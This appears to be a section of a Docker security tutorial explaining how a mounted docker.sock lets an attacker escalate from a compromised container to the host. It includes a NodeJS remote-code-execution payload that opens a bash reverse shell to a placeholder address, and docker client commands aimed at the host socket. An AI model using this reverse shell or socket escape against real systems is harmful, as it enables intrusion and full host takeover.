# Volume Mounts

If, an attacker would be able to exploit an application-level vulnerability, for example a NodeJS application using remote code execution to gain a reverse shell, then they would check into using the volume mounted `docker.sock` to gain privileges in the host system with docker runtime. 

Exploiting the RCE

```text
require("child_process").exec('bash -c "bash -i >%26 /dev/tcp/x.x.x.x/5555 0>%261"')
```

Now that the attacker has:

* Shell inside the docker container, they can explore the container for post exploitation
* They see that `ls -l /var/run/docker.sock` is available and mounted from the host system.

> **This allows the attacker to access the host docker service using host option with docker client by using the UNIX socket**

* The docker client is already downloaded into the container and is at `/root/docker`

```text
cd /root/docker/
ls -l
```

* To access the host resource using the `docker.sock` UNIX socket, an attacker would run the following, giving full privilege over the host system.

```text
./docker -H unix:///var/run/docker.sock ps
./docker -H unix:///var/run/docker.sock images
```